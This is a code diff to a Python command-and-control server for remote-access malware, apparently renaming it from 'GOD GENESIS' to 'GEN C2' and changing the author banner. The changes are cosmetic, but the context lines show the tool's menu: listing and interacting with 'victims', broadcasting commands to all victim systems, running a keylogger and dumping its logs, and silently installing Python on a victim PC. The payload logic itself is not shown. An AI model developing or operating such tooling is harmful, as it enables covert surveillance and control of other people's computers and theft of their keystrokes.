@@ -40,16 +40,7 @@ print(Fore.GREEN + '''\n
                        ^~~~^~~~^
             Ǥ ㄖ ㄖ Ð   ㄥ ㄩ 匚 Ҝ   卄 卂 乂 ㄖ 尺
 
-                
-
-░██████╗░░█████╗░██████╗░    ░██████╗░███████╗███╗░░██╗███████╗░██████╗██╗░██████╗
-██╔════╝░██╔══██╗██╔══██╗    ██╔════╝░██╔════╝████╗░██║██╔════╝██╔════╝██║██╔════╝
-██║░░██╗░██║░░██║██║░░██║    ██║░░██╗░█████╗░░██╔██╗██║█████╗░░╚█████╗░██║╚█████╗░
-██║░░╚██╗██║░░██║██║░░██║    ██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░░╚═══██╗██║░╚═══██╗
-╚██████╔╝╚█████╔╝██████╔╝    ╚██████╔╝███████╗██║░╚███║███████╗██████╔╝██║██████╔╝
-░╚═════╝░░╚════╝░╚═════╝░    ░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═════╝░╚═╝╚═════╝░
-
-                                          -- Fʀᴏᴍ Tʜᴇ Hᴏᴜsᴇ Oғ IEM(BCA) Mᴀᴅᴇ Bʏ Tᴇᴀᴍ BCAN 420 ''')
+                                          -- Mᴀᴅᴇ Bʏ Akhil Raj (lf32) ''')
 
 
 def sendtoall(target,data):
@@ -215,9 +206,6 @@ def shell(target, ip):
                             keylogger             --> Starts Key Logging Via Keylogger
                             dump_keylogger        --> Dump All Logs Done By Keylogger 
                             python_install        --> Installs Python In Victim Pc Without UI
-
-                            
-
                             ''')
         else:
             result = reliable_recv()
@@ -251,7 +239,7 @@ while True:
             targets_ip = ips[num]
             shell(targets_num, targets_ip)
         except:
-            print("GOD GENESIS doesn't recognize any session with that number")
+            print("GEN C2 doesn't recognize any session with that number")
 
 
     elif command == 'clear':
@@ -272,10 +260,7 @@ while True:
             print('Failed')
 
     elif command == 'shell_help':
-
-
             print('''\n
-
                             help                 --> Show this options
                             terminate            --> Exit the shell
                             clear                --> Clear the previous outputs
@@ -305,15 +290,10 @@ while True:
 
     elif command == 'help':
         print("""
-
-
                             sessions -l          --> List Down All The Victims Connected To C2 Server
                             sessions -i [session number]  --> Interact With Each Sessions Individually
                             sendall              --> Send Same Command To All The Victim's System      
                             shell_help           --> All commands before and after getting shell
-
-
-
             """)
 
 
